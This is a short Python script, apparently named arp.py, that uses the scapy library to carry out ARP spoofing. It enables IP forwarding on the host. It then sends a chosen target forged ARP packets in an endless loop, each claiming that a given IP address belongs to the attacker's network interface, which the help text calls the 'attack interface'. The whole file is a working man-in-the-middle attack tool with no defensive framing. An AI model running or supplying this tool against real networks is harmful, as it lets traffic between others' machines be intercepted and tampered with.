from scapy.all import *
from optparse import OptionParser
import os
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
def main(): 
    usage = 'example:python arp.py -i interface -t target -h host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='attack interface')
    parser.add_option('-t', dest='target', help='send ARP req to target')
    parser.add_option('--host', dest='host', help='src ip')
    (options, args) = parser.parse_args()
    if options.interface is None:
        parser.print_help()
        sys.exit(0) 
    src_mac = get_if_hwaddr(options.interface) 
    target_mac = getmacbyip(options.target)
    host=options.host
    target=options.target
    def send_req():
        pkt = Ether(src=src_mac, dst=target_mac) / ARP(hwsrc=src_mac, psrc=host, hwdst=target_mac, pdst=target)
        return pkt
    pkt = send_req()
    while True:
        sendp(pkt,inter=2,iface=options.interface)
if __name__ == '__main__':
    main()
